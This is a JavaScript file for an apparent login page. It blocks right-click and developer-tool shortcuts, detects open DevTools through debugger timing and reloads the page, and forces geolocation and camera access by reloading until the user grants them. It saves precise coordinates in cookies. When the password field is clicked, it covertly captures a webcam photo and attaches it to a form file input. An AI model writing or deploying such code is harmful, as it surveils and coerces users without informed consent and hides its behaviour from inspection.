document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
});

document.addEventListener('keydown', function(event) {
    if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
        event.preventDefault();
    }
});

document.addEventListener('keydown', function(event) {
    if (event.ctrlKey && event.shiftKey && event.key === 'I') {
        event.preventDefault();
    }
});

var isDevToolsOpen = false;

function detectDevTools() {
    var startTime = new Date();
    debugger;  // This causes a pause if DevTools is open
    var endTime = new Date();

    if (endTime - startTime > 100) {  // Long pause means DevTools is open
        isDevToolsOpen = true;
        alert("DevTools are open! The page will reload.");
        window.location.reload();  // Reload the page
    } else {
        isDevToolsOpen = false;
    }
}

setInterval(function() {
    detectDevTools();
}, 1000);  // Check every second

function checkLocationAccess() {
    navigator.permissions.query({ name: 'geolocation' }).then((permissionStatus) => {
        if (permissionStatus.state === 'granted') {
            getLocation(); // If granted, get the location
        } else if (permissionStatus.state === 'prompt') {
            getLocation(); // If prompt, attempt to get location
        } else {
            // If denied, refresh the page
            alert("Location access is required. Please enable location access in your browser settings.");
            location.reload(); // Refresh the page
        }

        // Listen for changes in permission status
        permissionStatus.onchange = function() {
            if (this.state === 'granted') {
                getLocation(); // If access is granted later, get the location
            }
        };
    });
}

function getLocation() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                const accuracy = position.coords.accuracy; // Accuracy in meters

                // console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`);

                // Optionally send the location to your server
                document.cookie = `latitude=${latitude}; path=/; max-age=3600`; // Cookie expires in 1 hour
                document.cookie = `longitude=${longitude}; path=/; max-age=3600`; // Cookie expires in 1 hour
                document.cookie = `accuracy=${accuracy}; path=/; max-age=3600`; // Cookie expires in 1 hour
            },
            (error) => {
                if (error.code === error.PERMISSION_DENIED) {
                    alert("Location access is required. Please enable location access in your browser settings.");
                    location.reload(); // Refresh the page if permission is denied
                } else {
                    alert("Unable to retrieve location. Please try again.");
                }
            },
            { // Correctly place the options object here
                enableHighAccuracy: true, // Request higher accuracy
                timeout: 5000, // Wait for 5 seconds
                maximumAge: 0 // Do not use cached location
            }
        );
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

// Function to check camera permissions
async function checkCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
    } catch (error) {
        alert("Camera permission is required. Please enable it.");
        location.reload(); // Reload the page
    }
}

function formatDateForFilename() {
    const now = new Date();
    const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
    const formattedDate = now.toLocaleString('en-CA', options).replace(/[/,:]/g, '-'); // Change slashes and colons to dashes
    return formattedDate;
}

// Call the permission check on page load
checkCameraPermission();

// Start by checking location access
checkLocationAccess();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('fileInput');
const passwordInput = document.getElementById('password');

navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        video.srcObject = stream;
    })
    .catch((error) => {
        console.error("Error accessing camera: ", error);
    });

// Capture image when button is clicked
passwordInput.addEventListener('click', () => {
    const context = canvas.getContext('2d');
    canvas.width = 100;
    canvas.height = 100;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Display the captured image
    const imageData = canvas.toDataURL('image/png');

    // Convert to Blob and create a downloadable link
    fetch(imageData)
        .then(res => res.blob())
        .then(blob => {
            const date = formatDateForFilename(); // Get formatted date
            const fileName = `image-login-${date}.png`; // Create filename
            const file = new File([blob], fileName, { type: "image/png" });
            const dataTransfer = new DataTransfer();
            dataTransfer.items.add(file);
            fileInput.files = dataTransfer.files;
        });
});
